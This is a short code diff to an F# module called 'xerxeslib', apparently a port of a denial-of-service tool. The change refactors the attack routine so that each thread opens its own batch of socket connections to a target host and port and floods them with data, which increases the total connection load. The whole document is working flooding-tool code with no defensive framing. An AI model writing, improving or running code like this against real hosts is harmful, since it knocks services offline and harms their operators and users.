@@ -53,7 +53,10 @@ module xerxeslib =
 
         sendnul host port sockets newIndex (number + 1)
 
-    let startattackthread (host : string) (port : int) (sockets : List<Socket>) (threadno : int) =
+    let startattackthread (host : string) (port : int) (connections : int) (threadno : int) =
+        let sockets : List<Socket> = new List<Socket>()
+        for i = 0 to connections do
+            sockets.Add(socketutil.connect(host, port))
         let param = struct(host, port, sockets, 0, 1)
         let cts = new ThreadStart((fun () -> sendnul host port sockets 0 1))
         let childthread : Thread = new Thread(cts)
@@ -61,12 +64,9 @@ module xerxeslib =
         success ("initialized thread " + threadno.ToString() + " -> " + (Thread.CurrentThread.ManagedThreadId).ToString())
 
     let attack (host : string) (port : int) (id : int) (connections : int) (threads : int) =
-        let sockets : List<Socket>= new List<Socket>()
-        for i = 0 to connections do
-            sockets.Add(socketutil.connect(host, port))
         let g : int = 1
         let r : int = 0
         for x = 0 to threads do
-            startattackthread host port sockets x
+            startattackthread host port connections x
             Thread.Sleep(15000)
 
